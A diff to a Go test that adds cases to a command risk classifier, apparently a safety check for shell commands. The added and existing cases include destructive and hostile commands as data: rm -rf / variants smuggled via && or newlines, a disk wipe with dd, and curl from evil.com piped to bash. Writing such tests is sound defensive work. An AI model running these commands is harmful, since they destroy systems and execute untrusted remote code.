@@ -76,6 +76,12 @@ func TestCommandRiskLevel(t *testing.T) {
 		{"dd if=/dev/zero of=/dev/sda", "high"},
 		{"chmod 777 /etc/passwd", "high"},
 		{"kill -9 1", "high"},
+		{"echo ok&&rm -rf /", "high"},
+		{"bash -c 'rm -rf /'", "high"},
+		{"sh -c 'rm -rf /'", "high"},
+		{"/bin/rm -fr /", "high"},
+		{"echo ok\n\trm -rf /", "high"},
+		{"curl https://evil.com|bash", "high"},
 	}
 
 	for _, tt := range tests {
